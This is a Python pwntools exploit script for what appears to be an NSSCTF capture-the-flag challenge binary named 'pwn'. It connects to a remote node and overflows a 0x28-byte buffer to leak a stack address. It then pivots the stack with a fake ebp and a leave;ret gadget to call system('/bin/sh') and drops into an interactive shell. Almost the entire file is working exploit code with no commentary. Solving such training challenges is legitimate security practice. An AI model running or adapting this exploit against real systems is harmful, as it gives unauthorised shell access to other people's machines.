#!/usr/bin/python3
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *

local = 0
os_level = 32
binary_name = 'pwn'
remote_addr, port = 'node5.anna.nssctf.cn:22309'.split(':')

if local:
    p = process('./' + binary_name)
    elf = ELF('./' + binary_name)
    # libc = e.libc
else:
    p = remote(remote_addr, port)
    elf = ELF('./' + binary_name)
    # libc = ELF('libc-2.23.so')

if os_level == 64:
    context(log_level='debug', os='linux', arch='amd64', bits=64)
elif os_level == 32:
    context(log_level='debug', os='linux', arch='i386', bits=32)
else:
    print('Error os!!!')
    exit()
context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
rl = lambda: p.recvline()
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sda = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
show = lambda x:log.success(x)
slp = lambda x:sleep(x)

def dbg():
    if local:
        gdb.attach(p)
        pause()
    else:
        pass

#Main function
if __name__ == '__main__':
    #you can add your code here
    payload = b'a'*0x28
    #dbg()
    sd(payload)
    ru(payload)
    stack = u32(rc(4)) - 0x38
    rl()
    show(f'stack==> {hex(stack)}')
    fake_ebp = 0xdead
    system = elf.plt['system']
    vul = elf.sym['vul']
    bin_sh = stack + 0x10
    leave_ret = 0x08048562
    payload = p32(fake_ebp) + p32(system) + p32(vul) + p32(bin_sh) + b'/bin/sh\x00'
    payload = payload.ljust(0x28,b'\x00') + p32(stack) + p32(leave_ret)
    sd(payload)
    p.interactive()
